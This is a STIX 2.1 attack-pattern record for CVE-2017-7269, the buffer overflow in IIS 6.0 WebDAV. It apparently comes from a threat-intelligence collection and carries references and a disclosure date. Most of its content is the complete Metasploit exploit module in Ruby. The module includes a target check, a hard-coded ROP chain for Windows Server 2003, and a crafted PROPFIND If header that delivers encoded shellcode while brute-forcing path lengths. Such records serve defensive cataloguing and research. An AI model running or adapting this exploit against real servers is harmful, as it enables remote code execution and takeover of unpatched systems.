{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0553c02-d57c-4a04-adb7-2438f431f5cb",
    "created": "2024-08-14T16:48:32.079429Z",
    "modified": "2024-08-14T16:48:32.079434Z",
    "name": "Microsoft IIS WebDav ScStoragePathFromUrl Overflow",
    "description": " Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016.  Original exploit by Zhiniang Peng and Chen Wu. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/iis_webdav_scstoragepathfromurl.rb",
            "external_id": "iis_webdav_scstoragepathfromurl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7269"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/edwardz246003/IIS_exploit"
        },
        {
            "source_name": "reference",
            "url": "https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS WebDav ScStoragePathFromUrl Overflow',\n      'Description'    => %q{\n          Buffer overflow in the ScStoragePathFromUrl function\n          in the WebDAV service in Internet Information Services (IIS) 6.0\n          in Microsoft Windows Server 2003 R2 allows remote attackers to\n          execute arbitrary code via a long header beginning with\n          \"If: <http://\" in a PROPFIND request, as exploited in the\n          wild in July or August 2016.\n\n          Original exploit by Zhiniang Peng and Chen Wu.\n      },\n      'Author'         =>\n        [\n        'Zhiniang Peng', # Original author\n        'Chen Wu',       # Original author\n        'Dominic Chell <dominic@mdsec.co.uk>', # metasploit module\n        'firefart', # metasploit module\n        'zcgonvh <zcgonvh@qq.com>', # metasploit module\n        'Rich Whitcroft', # metasploit module\n        'Lincoln' # minor updates to metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-7269' ],\n          [ 'BID', '97127' ],\n          [ 'URL', 'https://github.com/edwardz246003/IIS_exploit' ],\n          [ 'URL', 'https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'          => 2000,\n          'BadChars'       => \"\\x00\",\n          'EncoderType'    => Msf::Encoder::Type::AlphanumUnicodeMixed,\n          'DisableNops'    =>  'True',\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ESI',\n            }\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'       => 'process',\n          'PrependMigrate' => true,\n        },\n      'Targets'        =>\n        [\n          [\n            'Microsoft Windows Server 2003 R2 SP2 x86',\n            {\n              'Platform' => 'win',\n              'Arch'     => ARCH_X86\n            },\n          ],\n        ],\n      'Platform'       => 'win',\n      'DisclosureDate' => '2017-03-26',\n      'DefaultTarget'  => 0,\n      'Notes' =>\n          {\n              'AKA' => ['EXPLODINGCAN']\n          }\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',  [ true, 'Path of IIS 6 web application', '/']),\n        OptInt.new('MINPATHLENGTH', [ true, 'Start of physical path brute force', 3 ]),\n        OptInt.new('MAXPATHLENGTH', [ true, 'End of physical path brute force', 60 ]),\n      ])\n  end\n\n  def min_path_len\n    datastore['MINPATHLENGTH']\n  end\n\n  def max_path_len\n    datastore['MAXPATHLENGTH']\n  end\n\n  def supports_webdav?(headers)\n    if headers['MS-Author-Via'] == 'DAV' ||\n       headers['DASL'] == '<DAV:sql>' ||\n       headers['DAV'] =~ /^[1-9]+(,\\s+[1-9]+)?$/ ||\n       headers['Public'].to_s.include?('PROPFIND') ||\n       headers['Allow'].to_s.include?('PROPFIND')\n      return true\n    end\n\n    false\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => target_uri.path,\n      'method' => 'OPTIONS'\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless supports_webdav? res.headers\n      vprint_status 'Server does not support WebDAV'\n      return CheckCode::Safe\n    end\n\n    if res.headers['Server'].to_s.include? 'IIS/6.0'\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Detected\n  end\n\n  # corelan.be\n  # rop chain generated with mona.py\n  def create_rop_chain\n    [\n      #MSVCRT.dll - all Windows 2003\n      0x77bcb06c, # POP ESI # RETN\n      0x77bef001, # Write pointer # Garbage\n      0x77bb2563, # POP EAX # RETN\n      0x77ba1114, # <- *&VirtualProtect()\n      0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n      0x41414141, # junk\n      0x77bbee22, # XCHG EAX,ESI # ADD BYTE PTR DS:[EAX],AL # RETN\n      0x77bc9801, # POP EBP # RETN\n      0x77be2265, # ptr to 'push esp #  ret'\n      0x77bb2563, # POP EAX # RETN\n      0x03C0946F,\n      0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)\n      0x77bb48d3, # POP EBX, RET\n      0x77bf21e0, # .data\n      0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n      0x77bbfc02, # POP ECX # RETN\n      0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n      0x77bd8c04, # POP EDI # RETN\n      0x77bd8c05, # ROP NOP (-> edi)\n      0x77bb2563, # POP EAX # RETN\n      0x03c0944f,\n      0x77bdd441, # SUB EAX, 03c0940f\n      0x77bb8285, # XCHG EAX,EDX # RETN\n      0x77bb2563, # POP EAX # RETN\n      0x90909090, # nop\n      0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n    ].pack(\"V*\")\n  end\n\n  #encode string as UTF-8 char format that when converted to UTF-16LE\n  #will represent chars we want in memory\n  def utf_encode_str(str)\n    str.force_encoding('UTF-16LE').encode('UTF-8')\n  end\n\n  #filler chars to be encoded\n  def make_junk(len)\n    utf_encode_str rand_text_alpha(len)\n  end\n\n  def exploit\n    # extract the local servername and port from a PROPFIND request\n    # these need to be the values from the backend server\n    # if testing a reverse proxy setup, these values differ\n    # from RHOST and RPORT but can be extracted this way\n    vprint_status('Extracting ServerName and Port')\n    res = send_request_raw(\n      'method' => 'PROPFIND',\n      'headers' => {\n        'Content-Length' => 0\n      },\n      'uri' => target_uri.path\n    )\n    fail_with(Failure::BadConfig, 'Server did not respond correctly to WebDAV request') if(res.nil? || res.code != 207)\n\n    xml = res.get_xml_document\n    url = URI.parse(xml.at(\"//a:response//a:href\").text)\n    server_name = url.hostname\n    server_port = url.port\n    server_scheme = url.scheme\n\n    http_host = \"#{server_scheme}://#{server_name}:#{server_port}\"\n    vprint_status(\"Using http_host #{http_host}\")\n\n    print_status \"Trying path length #{min_path_len} to #{max_path_len} ...\"\n\n    min_path_len.upto(max_path_len) do |path_len|\n      vprint_status(\"Trying path length of #{path_len}...\")\n\n      begin\n        buf1 = \"<#{http_host}/\"\n        buf1 << rand_text_alpha(114 - path_len)\n        buf1 << make_junk(32)\n        #survive SHR instruction 0x02020202\n        buf1 << utf_encode_str([0x02020202].pack('V'))\n        #str pointer to .data httpext.dll # ebp-328 # used in wcslen calculation\n        buf1 << utf_encode_str([0x680312c0].pack('V'))\n        buf1 << make_junk(40)\n        #0x680313c0 -> destination pointer used with memcpy\n        buf1 << utf_encode_str([0x680313c0].pack('V'))\n        buf1 << \">\"\n        buf1 << \" (Not <locktoken:write1>) <#{http_host}/\"\n        buf1 << rand_text_alpha(114 - path_len)\n        buf1 << make_junk(28)\n        #0x680313c0  -> pointer to call itself at same address for vtable call\n        buf1 << utf_encode_str([0x680313c0].pack('V'))\n        #ROP 2 gadget -> advance ESP past previous instructions to start of ROP chain\n        #msvct.dll 0x77bdf38d # ADD ESP,1C # POP ECX # POP EBX # POP EAX # RETN\n        buf1 << utf_encode_str([0x77bdf38d].pack('V'))\n        buf1 << make_junk(8)\n        #0x680313c0 -> vtable pointer passed to EAX for call [eax +24]\n        #point to itself at [eax]\n        buf1 << utf_encode_str([0x680313c0].pack('V'))\n        buf1 << make_junk(16)\n        #ROP 1 gadget -> 0x68016082 stack flip get ECX into ESP and push EAX\n        #which also points to new ESP\n        buf1 << utf_encode_str([0x68016082].pack('V'))\n        buf1 << utf_encode_str(create_rop_chain)\n        #GetPC # push esp; pop esi; add esi, 10\n        buf1 << utf_encode_str(\"\\x54\\x5e\\x83\\xc6\")\n        #GetPC ESI +10 plus encode alignment\n        buf1 << utf_encode_str(\"\\x0a\\x41\")\n        buf1 << payload.encoded\n        buf1 << \">\"\n\n        vprint_status 'Sending payload'\n        res = send_request_raw(\n          'method' => 'PROPFIND',\n          'uri' => target_uri.path,\n          'headers' => {\n            'Content-Length' => 0,\n            'If' => \"#{buf1}\"\n          }\n        )\n        next unless res\n\n        vprint_status(\"Server returned status #{res.code}\")\n        next if res.code == 502 || res.code == 400\n\n        return if session_created?\n\n        vprint_status(\"Unknown Response: #{res.code}\")\n      rescue ::Errno::ECONNRESET\n        vprint_status('got a connection reset')\n        next\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-26",
    "x_mitre_platforms": [
        "win'"
    ]
}